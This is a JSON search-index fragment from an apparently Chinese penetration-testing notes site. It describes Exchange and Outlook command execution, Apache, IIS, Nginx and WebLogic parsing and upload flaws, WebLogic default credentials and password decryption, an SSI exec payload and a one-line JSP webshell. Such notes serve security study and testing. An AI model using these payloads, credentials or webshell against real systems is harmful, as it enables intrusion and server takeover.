relay"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#outlook","text":"OUTLOOK \u5ba2\u6237\u7aef\u6709\u4e00\u4e2a \u89c4\u5219\u4e0e\u901a\u77e5 \u7684\u529f\u80fd\uff0c\u901a\u8fc7\u8be5\u529f\u80fd\u53ef\u4ee5\u4f7foutlook\u5ba2\u6237\u7aef\u5728\u6307\u5b9a\u60c5\u51b5\u4e0b\u6267\u884c\u6307\u5b9a\u7684\u6307\u4ee4\u3002\u82e5\u6211\u4eec\u83b7\u5f97\u67d0\u7528\u6237\u7684\u51ed\u8bc1\uff0c\u53ef\u4ee5\u901a\u8fc7\u6b64\u529f\u80fd\u8bbe\u7f6e\u201c\u7528\u6237\u6536\u5230\u542b\u6307\u5b9a\u5b57\u7b26\u7684\u90ae\u4ef6\u65f6 \u6267\u884c\u6307\u5b9a\u7684\u6307\u4ee4\u6bd4\u5982clac.exe\u201d\uff0c\u5f53\u7528\u6237\u767b\u5f55outlook\u5ba2\u6237\u7aef\u5e76\u8bbf\u95ee\u5230\u6b64\u90ae\u4ef6\u65f6\uff0c\u5b83\u7684\u7535\u8111\u4fbf\u4f1a\u6267\u884ccalc.exe\u3002 \u4f46\u662f\uff0c\u5f53\u89e6\u53d1\u52a8\u4f5c\u4e3a\u542f\u52a8\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u53ea\u80fd\u76f4\u63a5\u8c03\u7528\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u5982\u542f\u52a8\u4e00\u4e2aexe\u7a0b\u5e8f\uff0c\u4f46\u65e0\u6cd5\u4e3a\u5e94\u7528\u7a0b\u5e8f\u4f20\u9012\u53c2\u6570\uff0c\u60f3\u8981\u76f4\u63a5\u4e0a\u7ebf\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06EXE\u653e\u5230\u67d0\u5171\u4eab\u76ee\u5f55\u4e0b\uff0c\u6216\u8005\u76f4\u63a5\u4e0a\u4f20\u5230\u7528\u6237\u7684\u673a\u5668\u3002 \u5177\u4f53\u6b65\u9aa4\u4e3a\u6253\u5f00\u89c4\u5219\u4e0e\u901a\u77e5\u529f\u80fd\uff0c\u7136\u540e\u65b0\u5efa\u529f\u80fd\uff0c\u5728\u63a5\u6536\u5230\u67d0\u6761\u4ef6\u90ae\u4ef6\u65f6\u542f\u52a8\u6307\u5b9a\u5e94\u7528\u7a0b\u5e8f \u6536\u5230\u542babc\u5185\u5bb9\u7684\u90ae\u4ef6\u540e\uff0c\u6210\u529f\u5f39\u8ba1\u7b97\u5668","title":"OUTLOOK \u547d\u4ee4\u6267\u884c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#proxylogon","text":"Exchange Server 2019 < 15.02.0792.010 Exchange Server 2019 < 15.02.0721.013 Exchange Server 2016 < 15.01.2106.013 Exchange Server 2013 < 15.00.1497.012 h ttps://github.com/jeningogo/exchange-ssrf-rce/blob/main/exchange-exp.py \u524d\u63d0\u662f\u9700\u8981\u4e00\u4e2aoutlook\u8d26\u6237","title":"proxylogon \u547d\u4ee4\u6267\u884c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%8A%9E%E5%85%AC%E7%B3%BB%E7%BB%9F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#cve-2020-0688-rce","text":"Microsoft Exchange Server 2010 Service Pack 3 Microsoft Exchange Server 2013 Microsoft Exchange Server 2016 Microsoft Exchange Server 2019 \u9700\u8981\u4e00\u4e2a\u8d26\u6237 https://github.com/zcgonvh/CVE-2020-0688","title":"CVE-2020-0688 rce"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","text":"\u5e38\u89c1\u4e2d\u95f4\u4ef6\u7684\u653b\u51fb\u65b9\u5f0f \u76ee\u5f55 apache apache\u6587\u4ef6\u591a\u540e\u7f00\u540d\u89e3\u6790\u6f0f\u6d1e apache \u6362\u884c\u7ed5\u8fc7 apache ssi\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08\u539f\u7406\u548cssi\u6ce8\u5165\u4e00\u6837\uff09 iis \u5173\u4e8e/\u7684php\u89e3\u6790\u6f0f\u6d1e(iis7/7.5\u89e3\u6790\u6f0f\u6d1e) PUT\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e iis6\u7578\u5f62\u89e3\u6790\u6f0f\u6d1e Nginx \u2018/\u2019\u5b57\u7b26\u89e3\u6790\u6f0f\u6d1e\uff08\u548ciis7/7.5\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\u4e00\u81f4\uff09 \u76ee\u5f55\u904d\u5386\u5c0f\u6d1e \u76ee\u5f55\u7a7f\u8d8a CRLF\u6ce8\u5165 Nginx \u6587\u4ef6\u540d\u903b\u8f91\u6f0f\u6d1e\uff08CVE-2013-4547\uff09 WebLogic \u5f31\u53e3\u4ee4 \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u57fa\u7840\u4e0a\u7684\u540e\u53f0\u5bc6\u7801\u7834\u89e3 \u540e\u53f0\u4f20\u6728\u9a6c\u63d0\u6743 weblogic uudi\u7ec4\u4ef6\u9020\u6210\u7684\u7aef\u53e3\u63a2\u6d4b Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08CVE-2018-2894\uff09 apache apache\u6587\u4ef6\u591a\u540e\u7f00\u540d\u89e3\u6790\u6f0f\u6d1e \u4e0e\u5176\u8bf4\u8fd9\u662f\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u4e0d\u5982\u8bf4\u8fd9\u662f\u4e00\u4e2a\u7279\u6027\uff0c\u5f88\u591a\u7a0b\u5e8f\u5458\u4e0d\u77e5\u9053\u8fd9\u79cd\u7279\u6027\uff0c\u6240\u4ee5\u4f1a\u5199\u51fa\u6709\u95ee\u9898\u7684\u4ee3\u7801\u3002 \u7279\u6027\uff1a\u591a\u540e\u7f00\u540d(\u5168\u7248\u672c\u90fd\u6709\u8fd9\u4e2a\u7279\u6027\uff09 apache\u5728\u89e3\u6790\u4e00\u4e2a\u6587\u4ef6\u7684\u540e\u7f00\u540d\u65f6\uff0c\u662f\u4ece\u53f3\u5f80\u5de6\u89e3\u6790\u540e\u7f00\u540d\u7684\uff0c\u5982\u679c\u53f3\u8fb9\u7684\u540e\u7f00\u540d\u4e0d\u8ba4\u8bc6\uff0c\u5c31\u4f1a\u7ee7\u7eed\u5411\u5de6\u8bc6\u522b\uff0c\u76f4\u5230\u8bc6\u522b\u5230\u4e00\u4e2a\u8ba4\u8bc6\u7684\u540e\u7f00\u540d\uff0c\u4f46\u662f\u4e07\u4e00\u90fd\u4e0d\u8ba4\u8bc6\u5462?\u90fd\u4e0d\u8ba4\u8bc6\u7684\u8bdd\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662fplain/text\u5904\u7406\u3002\u90a3\u4e48apache\u662f\u600e\u4e48\u77e5\u9053\u54ea\u4e2a\u540e\u7f00\u540d\u5b83\u662f\u8ba4\u8bc6\u7684\u5462?\u7b54\u6848\u662f\u8ba4\u8bc6\u7684\u540e\u7f00\u540d\u4eec\u90fd\u88ab\u8bb0\u5f55\u5230\u4e00\u4e2a\u53ebmime.types\u7684\u6587\u4ef6\u4e2d\u4e86\u3002\u8fd9\u4e2a\u6587\u4ef6\u5462,Windows\u653e\u5728conf\u6587\u4ef6\u5939\u91cc\uff0clinux\u653e\u5728/etc/mime.types\uff08\u4e0d\u4e00\u5b9a\u5728\u8fd9\u91cc\uff0c\u9700\u8981\u81ea\u5df1\u627e\u627e\uff09,\u6253\u5f00\u540e\u662f\u8fd9\u6837 \u5b9a\u4e49\u4e86\u4e0d\u540c\u7684\u540e\u7f00\u540d\u5e94\u8be5\u5411\u6d4f\u89c8\u5668\u8fd4\u56de\u4ec0\u4e48\u6837\u7684mime\u683c\u5f0f\u3002\u8fd9\u91cc\u8981\u8bf4\u7684\u662f\u6709\u4e9b\u60c5\u51b5\u4e0b\u7684mime.types\u6ca1\u6709\u63d0\u4f9b\u5bf9php\u7684\u89e3\u6790\u65b9\u6cd5\uff0c\u5bf9php\u7684\u89e3\u6790\u89c4\u5219\u653e\u5728\u53e6\u4e00\u4e2a\u6587\u4ef6\uff0cWindows\u4e0b\u5728/conf/extra/httpd-php.conf\u3002Linux\u4e5f\u6709\u8fd9\u4e2a\u6587\u4ef6\u5728/etc/apache2/mods-enabled/php7.2.conf\uff08\u6216\u8005\u548cWindows\u7684\u8def\u5f84\u4e00\u6837),\u6253\u5f00\u540e\u662f\u8fd9\u6837\u7684\uff0c\u5b9a\u4e49\u4e86\u6587\u4ef6\u540d\u6ee1\u8db3\u4ec0\u4e48\u6761\u4ef6(\u6b63\u5219\u8868\u8fbe\u5f0f)\u624d\u4f1a\u5c06\u4ed6\u7ed9php\u5904\u7406\u5668\u5904\u7406,\u800c\u4e14\uff0c\u5982\u679c\u4f60mime.types\u91cc\u5339\u914d\u5230\u4e86php\u540e\u7f00\uff0c\u4f46\u8fd9\u4e2a\u5904\u7406\u5668\u5339\u914d\u6587\u4ef6\u6ca1\u6709\u5339\u914d\u6210\u529f\uff0c\u4ed6\u8fd8\u662f\u4e0d\u4f1a\u628aphp\u6587\u4ef6\u8fdb\u884c\u5904\u7406 \u53ef\u4ee5\u8bd5\u4e00\u8bd5\uff0c\u786e\u5b9e\u662f\u8fd9\u6837\u7684,apache\u5bf9\u8fd9\u4e2a\u6587\u4ef6\u7b2c\u4e00\u4e2a\u5339\u914d\u5230\u7684\u540e\u7f00\u540d\u662fjpg\uff0c\u6240\u4ee5\u628a\u5b83\u5f53\u4f5c\u56fe\u7247\u5904\u7406\u4e86\uff0c\u8fd4\u56de\u4e86\u56fe\u7247\u7c7b\u578b\u7684mime\u5934\uff0c\u6d4f\u89c8\u5668\u4e5f\u5c31\u628a\u8fd9\u4e2a\u6587\u4ef6\u5f53\u4f5c\u56fe\u7247\u5904\u7406\uff0c\u4e8e\u662f\u51fa\u73b0\u4e86\u8fd9\u79cd\u60c5\u51b5 \u5f53\u7136\uff0c\u7528\u8fd9\u79cd\u591a\u57df\u540d\u7279\u6027\u53bb\u89e3\u6790php\u6587\u4ef6\u7684\u8bdd\uff0c\u5c31\u9700\u8981\u5728\u4e0a\u6587\u63d0\u5230\u7684\u6587\u4ef6\u91cc\u53bb\u4fee\u6539\u4fee\u6539\u54e6\u3002 apache \u6362\u884c\u7ed5\u8fc7 2.4.0\\~2.4.29\u7248\u672c\u4e2d\u5b58\u5728\u4e00\u4e2a\u89e3\u6790\u6f0f\u6d1e\uff0c\u5728\u89e3\u6790PHP\u65f6\uff0c 1.php\\x0A \u5c06\u88ab\u6309\u7167PHP\u540e\u7f00\u8fdb\u884c\u89e3\u6790\uff0c\u5bfc\u81f4\u7ed5\u8fc7\u4e00\u4e9b\u670d\u52a1\u5668\u7684\u5b89\u5168\u7b56\u7565\u3002 apache ssi\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08\u539f\u7406\u548cssi\u6ce8\u5165\u4e00\u6837\uff09 \u5982\u679c\u670d\u52a1\u5668\u5f00\u542f\u4e86ssi\u4e0ecgi\u652f\u6301,\u5373\u53ef\u4e0a\u4f20shtml\u6587\u4ef6\u5e76\u5728shtml\u6587\u4ef6\u4e2d\u8f93\u5165ssi\u6307\u4ee4 \\<!\u2013#exec cmd=\u201dpayload\u201d \u2013>\uff0c\u5982 \\<!\u2013#exec cmd=\u201dls\u201d \u2013> ,\u7136\u540e\u518d\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u5373\u53ef\u83b7\u5f97ls\u7684\u7ed3\u679c iis \u5173\u4e8e/\u7684php\u89e3\u6790\u6f0f\u6d1e(iis7/7.5\u89e3\u6790\u6f0f\u6d1e) \u9002\u7528\u7248\u672c iis7/7.5 \u524d\u63d0\u6761\u4ef6: 1.php.ini\u91cc\u7684cgi.fix_pathinfo\u8bbe\u7f6e\u4e3a1,\u4e14\u7ed3\u5408\u65b9\u5f0f\u662ffast-cgi 2.\u5f00\u542fFast-CGI\u8fd0\u884c\u6a21\u5f0f \u4f5c\u7528: \u5728\u8bbf\u95ee\u67d0\u4e2a\u6587\u4ef6\u65f6\uff0c\u5728\u8def\u5f84\u540e\u52a0 / .php(\u8fd9\u91cc\u7684 \u6307\u4efb\u610f\u5b57\u7b26)\uff0c\u5373\u53ef\u8ba9\u670d\u52a1\u5668\u628a\u628a\u8be5\u6587\u4ef6\u5f53\u4f5cphp\u6587\u4ef6\u89e3\u6790\u5e76\u8fd4\u56de \u5982\u56fe\u6211\u5728\u4e00\u4e2atxt\u6587\u4ef6\u4e2d\u5199\u5165php\u4ee3\u7801\uff0c\u8ba9\u540e\u8bbf\u95ee\u5b83\u65f6\u5728\u8def\u5f84\u6700\u540e\u52a0\u4e86/a.php\uff0c\u5b83\u5c31\u88ab\u89e3\u6790\u4e3aphp\u6587\u4ef6\u4e86 PUT\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e 1.\u9002\u7528\u7248\u672c iis6.0 2.\u524d\u63d0\u6761\u4ef6:\u670d\u52a1\u5668\u5f00\u542f\u4e86webdav\u670d\u52a1\u5e76\u4e14\u8bbe\u7f6e\u4e86\u5199\u5165\u6743\u9650 \u540c\u65f6\u627e\u5230\u8bbf\u95ee\u7f51\u7ad9\u7684\u7528\u6237\u662f\u54ea\u4e2a\u5e76\u7ed9\u4ed6\u8bfb\u53d6\u548c\u5199\u5165\u6743 3.\u6982\u8ff0\uff1a\u7528PUT\u65b9\u6cd5\u4e0a\u4f20\u6587\u4ef6,\u5e76\u5c1d\u8bd5getshell \u4e0a\u4f20,\u5e76\u4e14\u786e\u5b9e\u4e0a\u4f20\u6210\u529f\uff0c\u4f46\u662f\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u65e0\u6cd5\u4e0a\u4f20php\u7b49\u811a\u672c\u6587\u4ef6 \u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u4f1a\u60f3\u5230\u7528move\u65b9\u6cd5\u6765\u5c06txt\u6587\u4ef6\u8f6c\u5316\u4e3aphp\u6587\u4ef6,\u4f46\u76f4\u63a5move\u5f80\u5f80\u662f\u4e0d\u884c\u7684\uff0c\u8981\u7528\u5230iis6.0\u89e3\u6790\u6f0f\u6d1e\uff0c\u628a\u5b83\u5199\u6210shell.php;.txt\u5c31\u53ef\u4ee5\u4e86getshell\u4e86 iis6\u7578\u5f62\u89e3\u6790\u6f0f\u6d1e iis6.0\u73af\u5883\u4e0b\u4f1a\u628a\u6587\u4ef6\u7578\u5f62\u89e3\u6790: 1.\u5728\u4e00\u4e2a\u6587\u4ef6\u540e\u9762\u52a0;.\u4efb\u610f\u540e\u7f00\u540d\uff1a\u5047\u8bbe\u6709\u4e2a\u6587\u4ef6\u662fa.php\uff0c\u6211\u4eec\u628a\u5b83\u6539\u6210a.php;a.txt\uff0c\u4ed6\u8fd8\u662f\u4f1a\u88ab\u89e3\u6790\u6210php\u6587\u4ef6\u4f46\u662f\u56e0\u4e3a\u540e\u7f00\u540d\u662ftxt\u6240\u4ee5\u4f1a\u7ed5\u8fc7\u4e00\u4e9b\u9632\u62a4 2.\u5728\u4e00\u4e2a\u540d\u4e3a *.php(\u5982a.php)\u7684\u6587\u4ef6\u5939\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u90fd\u4f1a\u88ab\u89e3\u6790\u4e3aphp Nginx \u2018/\u2019\u5b57\u7b26\u89e3\u6790\u6f0f\u6d1e\uff08\u548ciis7/7.5\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\u4e00\u81f4\uff09 url/xxx.gif/xx.php\u4f1a\u88ab\u89e3\u6790\u4e3aphp\u6587\u4ef6 \u524d\u63d0\u6761\u4ef6:cgi.fix_pathinfo=1 \u76ee\u5f55\u904d\u5386\u5c0f\u6d1e \u524d\u63d0\u6761\u4ef6: nginx-conf \u628a\u8fd9\u4e2a\u9009\u9879\u6539\u4e3aon\u5373\u53ef \u76ee\u5f55\u7a7f\u8d8a \u524d\u63d0\u6982\u8981:\u8981\u7528\u5230\u522b\u540dalias \u4f5c\u7528: \u5f53\u8bbe\u7f6e\u522b\u540d\u65f6\uff0clocation\u540e\u9762\u7684\u8def\u5f84\u6ca1\u6709\u7528/\u95ed\u5408\u65f6\uff0c\u5c31\u4f1a\u5f15\u8d77\u8bbf\u95ee url/xx../\u65f6\u8fd4\u56de\u7684\u76ee\u5f55\u662f\u5f53\u524d\u6587\u4ef6\u5939\u7684\u4e0a\u5c42\u76ee\u5f55 \u53ef\u89c1\u8fd4\u56de\u7684\u76ee\u5f55\u662f\u4e0a\u5c42\u76ee\u5f55 CRLF\u6ce8\u5165 \u524d\u63d0\u6761\u4ef6\u4e0e\u4ea7\u751f\u539f\u56e0: 1.\u968f\u7740\u4e1a\u52a1\u7684\u53d1\u5c55\uff0c\u6709\u4e9b\u7f51\u7ad9\u4f1a\u628a http://xxx \u91cd\u5b9a\u5411\u4e3a https://xxx \u6216 http://x.com \u91cd\u5b9a\u5411\u4e3a http://www.x.com , \u90a3\u4e48\u8fd9\u79cd\u91cd\u5b9a\u5411\u7684\u539f\u7406\u5728nginx\u4e0a\u7684\u5b9e\u73b0\u65b9\u5f0f\u662f\u5728location\u5757\u91cc\u52a0\u5165return 302 http\\:// $host:81$ uri;\u4e4b\u7c7b\u7684\u8bed\u53e5\uff0c \u8fd9\u91cc\u7684 $host,$ url\u90fd\u662f\u53d8\u91cf\u3002 $host\u4e00\u822c\u4e3a\u8bf7\u6c42\u5934\u7684host\u5934\u90e8,$ url\u4e00\u822c\u4e3a\u8bf7\u6c42\u884c\u91cc\u7684\u8def\u5f84\u90e8\u5206 \u5982 GET /url HTTP/1.1\u6b64\u5904\u7684/url\u90e8\u5206. 2.http\u5934\u90e8\u91cc\uff0c0d\uff08cr\uff09\u548c0a\uff08lf\uff09\u5b57\u7b26\u662f\u7528\u6765\u5206\u5272\u8bf7\u6c42\u5934\u90e8\u533a\u57df\u7684\u5b57\u7b26\u3002\u5934\u90e8\u7684\u884c\u662f\u4ee5\u4e00\u4e2acrlf\u6765\u5206\u5272\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u8bf7\u6c42\u5934\u90e8\u6bcf\u4e2a\u884c\u4e4b\u95f4\u90fd\u5b58\u5728\u7740\u4e00\u4e2acrlf\u5b57\u7b26\u6765\u5206\u5272\u5b83\u4eec\uff0c\u8ba9\u4ed6\u4eec\u6210\u4e3a\u591a\u4e2a\u72ec\u7acb\u7684\u884c\u3002\u5934\u90e8\u4e0ebody\u4e4b\u95f4\u6709\u4e24\u4e2acrlf\u6765\u5206\u5272 \u4f5c\u7528:\u5f53\u67d0\u53f0nginx\u8bbe\u7f6e\u4e86\u5f62\u5982return 302 http\\:// $host:80$ uri; \u8fd9\u79cd\u914d\u7f6e\u65f6\uff0curl\u662f\u6211\u4eec\u5b8c\u5168\u53ef\u63a7\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728url\u4e2d\u4eba\u4e3a\u6784\u9020crlf\u5b57\u7b26\u6765\u5b9e\u73b0\u5206\u884c\uff0c\u4ece\u800c\u5728\u54cd\u5e94\u5934\u4e2d\u6ce8\u5165\u6211\u4eec\u60f3\u8981\u5f97\u5230\u7684\u54cd\u5e94\u5934\u90e8\u3002 Nginx \u6587\u4ef6\u540d\u903b\u8f91\u6f0f\u6d1e\uff08CVE-2013-4547\uff09 Nginx 0.8.41 \\~ 1.4.3 / 1.5.0 \\~ 1.5.7 url/xxxxx.gif%20 \u7684\u6587\u4ef6 \u88ab url/xxxxx.gif%20\\0x00.php (\\0x00\u987b\u5728burp\u91cc\u7684hex\u91cc\u6539) \u9700\u5f00\u542ffastcgi \u7136\u540e\u53d1\u5305\u8bf7\u6c42\u8fd9\u4e2a\u6587\u4ef6,\u5e76\u4e14\u5728\u8bf7\u6c42\u65f6\u505a\u70b9\u624b\u811a WebLogic \u5f31\u53e3\u4ee4 User ID system Password password Level Administrator User ID weblogic Password weblogic Level Administrator User ID weblogic Password weblogic User ID admin Password security User ID joe Password password User ID mary Password password User ID system Password security User ID wlcsystem Password wlcsystem User ID wlpisystem Password wlpisystem \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u57fa\u7840\u4e0a\u7684\u540e\u53f0\u5bc6\u7801\u7834\u89e3 \u5047\u8bbe\u6211\u4eec\u80fd\u524d\u53f0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6,\u4f46\u662f\u540e\u53f0\u7684\u8d26\u6237\u5bc6\u7801\u662f\u52a0\u5bc6\u7684.\u5982\u4f55\u7834\u89e3 weblogic\u65b0\u7248\u672c\u7528\u7684\u662fAES\u52a0\u5bc6\uff0c\u8001\u7248\u672c\u7528\u7684\u662f3DES\u52a0\u5bc6 \u90fd\u662f\u5bf9\u79f0\u52a0\u5bc6\uff0c\u6709\u5bc6\u94a5\u5c31\u53ef\u89e3 \u5047\u8bbe\u524d\u53f0\u53ef\u4ee5\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u8981\u7528\u5230\u7528\u6237\u7684\u5bc6\u6587\u548c\u52a0\u5bc6\u7684\u5bc6\u94a5\u5373\u53ef\u7834\u89e3\u3002\u8fd9\u4e24\u4e2a\u6587\u4ef6\u5728base_domain\u4e0b, \u4e3a./security/ SerializedSystemIni.dat \u548c config/config.xml \u8fd9\u91cc\u503c\u5f97\u4e00\u63d0\u7684\u662f,.dat\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6,\u5efa\u8baeburp\u6253\u5f00\u4e0d\u7136\u5bb9\u6613\u4e71\u7801 \u628a\u4e8c\u8fdb\u5236\u4fe1\u606fcopy to file\u4fdd\u5b58\u4e0b\u6765. \u83b7\u53d6config.xml xml\u6587\u6863\u91cc\u8fd9\u624d\u662f\u7ba1\u7406\u5458\u8d26\u6237 \u5f00\u59cb\u89e3\u5bc6\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u662f https://github.com/TideSec/Decrypt_Weblogic_Password \u4e2d\u7684tools5 \u89e3\u5bc6\u6210\u529f\u3002\u767b\u5f55\u5c31\u5b8c\u4e8b\u4e86 \u540e\u53f0\u4f20\u6728\u9a6c\u63d0\u6743 \u540e\u53f0\u4f20jsp\u6728\u9a6c\u7684war\u5305\u5c31\u884c\u4e86 \u600e\u4e48\u751f\u6210war\u5305: jar cvf shell.war \u6728\u9a6c\u6e90\u6587\u4ef6 \u90e8\u7f72-\u300b\u5b89\u88c5-\u300b\u4e0a\u8f7d\u6587\u4ef6-\u300b\u9009\u62e9\u6587\u4ef6\u9009\u62e9war\u5305-\u300b\u4e00\u76f4\u4e0b\u4e00\u6b65\u7136\u540e\u5b8c\u6210 \u8bbf\u95eewar\u5305\u76ee\u5f55\u4e0b\u7684\u6728\u9a6c\u6587\u4ef6\u5373\u53ef \u9a6c\u5b50\u662f\u4e00\u53e5\u8bdd\u9a6c\u5b50 <%Runtime.getRuntime.exec(request.getParameter(\u201ccmd\u201d));%> \u547d\u4ee4\u5efa\u8bae\u7528\u8fd9\u4e2a\u7f51\u7ad9\u7f16\u7801\u4e00\u4e0b\uff0c\u4e0d\u7136\u6709\u53ef\u80fd\u4e0d\u4f1a\u6267\u884c http://www.jackson-t.ca/runtime-exec-payloads.html weblogic uudi\u7ec4\u4ef6\u9020\u6210\u7684\u7aef\u53e3\u63a2\u6d4b \u82e5weblogic\u52a0\u8f7d\u4e86uudi\u7ec4\u4ef6\uff0c\u90a3\u4e48\u5728 /uddiexplorer/SearchPublicRegistries.jsp \u4f1a\u5b58\u5728\u7aef\u53e3\u63a2\u6d4b\u95ee\u9898 \u5bf9\u8be5jsp\u4f20\u53c2 ?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 \u6211\u4eec\u901a\u8fc7\u6539\u53d8operator\u7684\u7aef\u53e3\u53d1\u5305\uff0c\u770b\u9875\u9762\u53d8\u5316\u5373\u53ef\u7aef\u53e3\u63a2\u6d4b \u7aef\u53e3\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u6709could not connect over HTTP to server: \u5b58\u5728\u5c31\u6709404 error code (Not Found). Please ensure that your URL is correct, Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08CVE-2018-2894\uff09 WebLogic\u7ba1\u7406\u7aef\u672a\u6388\u6743\u7684\u4e24\u4e2a\u9875\u9762\u5b58\u5728\u4efb\u610f\u4e0a\u4f20getshell\u6f0f\u6d1e\uff0c\u53ef\u76f4\u63a5\u83b7\u53d6\u6743\u9650\u3002\u4e24\u4e2a\u9875\u9762\u5206\u522b\u4e3a/ws_utc/begin.do\uff0c/ws_utc/config.do \u5f71\u54cd\u7248\u672c Oracle WebLogic Server\uff0c\u7248\u672c10.3.6.0\uff0c12.1.3.0\uff0c12.2.1.2\uff0c12.2.1.3\u3002 \u524d\u63d0\u6761\u4ef6:\u7ba1\u7406\u5458\u5728\u540e\u53f0 ->base_domain->\u914d\u7f6e->\u4e00\u822c\u4fe1\u606f->\u9ad8\u7ea7\uff0c\u628a\u8fd9\u4e2a\u52fe\u9009\u4e86 \u5f00\u542f\u540e\u6211\u4eec\u6765\u5230 \uff0c\u628a\u8fd9\u4e2a\u6539\u4e3a \u8def\u5f84 /user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css \u7136\u540e\u70b9\u5b89\u5168\uff0c\u518d\u70b9\u6dfb\u52a0\uff0c\u628a\u6211\u4eec\u7684jsp\u9a6c\u4f20\u4e0a\u53bb \u6293\u5305\uff0c\u83b7\u53d6\u8be5\u6728\u9a6c\u7684\u65f6\u95f4\u6233 \u8bbf\u95ee http://123.57.137.109:7001/ws_utc/css/config/keystore/\u65f6\u95f4\u6233_\u6587\u4ef6\u540d \u6210\u529f\u8bbf\u95ee\u6211\u7684\u9a6c\u513f \u4fee\u590d: \u8bbe\u7f6eConfig.do \u3001begin.do\u9875\u9762\u767b\u5f55\u6388\u6743\u540e\u8bbf\u95ee ,\u5347\u7ea7\uff0c\u52a0waf","title":"\u5e38\u89c1\u4e2d\u95f4\u4ef6\u7684\u653b\u51fb\u65b9\u5f0f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_1","text":"","title":"\u5e38\u89c1\u4e2d\u95f4\u4ef6\u7684\u653b\u51fb\u65b9\u5f0f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_2","text":"apache apache\u6587\u4ef6\u591a\u540e\u7f00\u540d\u89e3\u6790\u6f0f\u6d1e apache \u6362\u884c\u7ed5\u8fc7 apache ssi\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08\u539f\u7406\u548cssi\u6ce8\u5165\u4e00\u6837\uff09 iis \u5173\u4e8e/\u7684php\u89e3\u6790\u6f0f\u6d1e(iis7/7.5\u89e3\u6790\u6f0f\u6d1e) PUT\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e iis6\u7578\u5f62\u89e3\u6790\u6f0f\u6d1e Nginx \u2018/\u2019\u5b57\u7b26\u89e3\u6790\u6f0f\u6d1e\uff08\u548ciis7/7.5\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\u4e00\u81f4\uff09 